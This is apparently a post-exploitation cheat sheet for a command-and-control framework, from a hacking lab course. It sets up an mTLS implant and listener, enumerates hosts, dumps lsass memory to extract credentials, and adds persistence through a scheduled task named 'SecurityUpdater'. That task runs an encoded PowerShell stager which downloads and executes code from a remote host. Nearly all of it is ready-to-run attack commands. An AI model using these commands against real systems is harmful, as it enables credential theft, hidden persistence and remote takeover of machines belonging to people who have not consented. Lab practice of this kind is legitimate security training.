#c2 

create a profile:
```bash
profiles new -e -f exe --mtls "mtls://192.168.100.11:4444"
```

create a payload with this profile:
```bash
profiles generate mtls
```

setting up a listener:
```bash
mtls -L 192.168.56.1 -l 4444
```

to use the beacon:
```bash
use <ID OF THE BEACON>
```

---

```bash
# eunumeration using seatbelt:
seatbelt -- -group=all

# tool like powerup
sharpup -- audit

# running rubues
execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe


# dump lsass.exe (REQUIRE SYSTEM PRIVILEGES):
ps -e lsass
procdump --pid 660 --save /tmp/lsass.dmp

pypykatz lsa minidump /tmp/lsass.dmp # decrypt it
```
---
# persistence

### schtasks

we base-64 of stager:
```powershell
echo -en "iex(new-object net.webclient).downloadString('http://10.10.14.62:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0

# or
$command = "iex(new-object net.webclient).downloadString('http://10.10.14.62:8088/stager.txt')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
$encoded

```

 to be used with schtasks. 
```powershell
execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr \"powershell.exe -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAMgA6ADgAMAA4ADgALwBzAHQAYQBnAGUAcgAuAHQAeAB0ACcAKQA="'
```